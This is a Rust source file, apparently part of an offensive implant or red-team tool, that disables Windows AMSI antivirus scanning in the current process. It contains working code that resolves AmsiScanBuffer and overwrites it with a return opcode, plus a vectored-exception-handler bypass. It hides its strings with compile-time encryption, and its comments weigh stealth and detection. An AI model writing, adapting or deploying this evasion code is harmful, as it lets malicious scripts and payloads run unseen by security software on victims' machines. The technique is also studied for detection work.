use std::ffi::c_void;

use str_crypter::{decrypt_string, sc};
use windows_sys::Win32::System::{
    Diagnostics::Debug::{AddVectoredExceptionHandler, WriteProcessMemory},
    Threading::GetCurrentProcess,
};

use crate::{
    evasion::veh::{addr_of_amsi_scan_buf, veh_handler},
    utils::console::{print_failed, print_info},
};

/// Evades AMSI in the current process if the AMSI patching feature flag is enabled. This function can
/// be called without checking whether the feature flag is enabled, as the check happens within the
/// function.
///
/// **NOTE**: This function WILL NOT load amsi for you or check if it is loaded ahead of time. That
/// responsibility is on the caller.
///
/// # Returns
/// The function will return a `bool` indicating whether the AMSI evasion was successful; returns `false`
/// if it failed.
pub fn evade_amsi() -> bool {
    #[cfg(feature = "patch_amsi")]
    {
        // NOTE: Disabling for now in favour of the possibly more stealthy VEH^2 technique
        // amsi_patch_ntdll();

        //
        // The best shot we got for VEH^2 in determining if it was successful is checking that the DLL is
        // loaded.. if not, it will not work and should return false, so check that before continuing.
        //
        if addr_of_amsi_scan_buf().is_none() {
            return false;
        }

        //
        // Ok now call actual technique
        //
        amsi_veh_squared();

        return true;
    }

    print_info(sc!("WARNING: Not patching AMSI. This could be dangerous.", 49).unwrap());
    false
}
fn amsi_patch_ntdll() {
    use shared_no_std::export_resolver::resolve_address;

    use crate::utils::console::print_info;

    print_info(sc!("Patching amsi..", 49).unwrap());

    let fn_addr = match resolve_address(&sc!("amsi.dll", 42).unwrap(), "AmsiScanBuffer", None) {
        Ok(a) => a,
        Err(_) => {
            #[cfg(debug_assertions)]
            use crate::utils::console::print_failed;

            #[cfg(debug_assertions)]
            print_failed("Failed to find function AmsiScanBuffer..");

            return;
        }
    };

    let handle = unsafe { GetCurrentProcess() };
    let ret_opcode: u8 = 0xC3;

    let size = std::mem::size_of_val(&ret_opcode);
    let mut bytes_written: usize = 0;

    let _res = unsafe {
        WriteProcessMemory(
            handle,
            fn_addr,
            &ret_opcode as *const u8 as *const c_void,
            size,
            &mut bytes_written,
        )
    };
}

#[inline(always)]
fn amsi_veh_squared() -> bool {
    let h = unsafe { AddVectoredExceptionHandler(1, Some(veh_handler)) };
    if h.is_null() {
        print_failed(sc!("Failed to execute AddVectoredExceptionHandler", 0xEF).unwrap());
        return false;
    }

    // This is statically (and/or at runtime) probably quite easy to detect immediately after calling AVEH??
    unsafe { core::arch::asm!("int3") };

    true
}
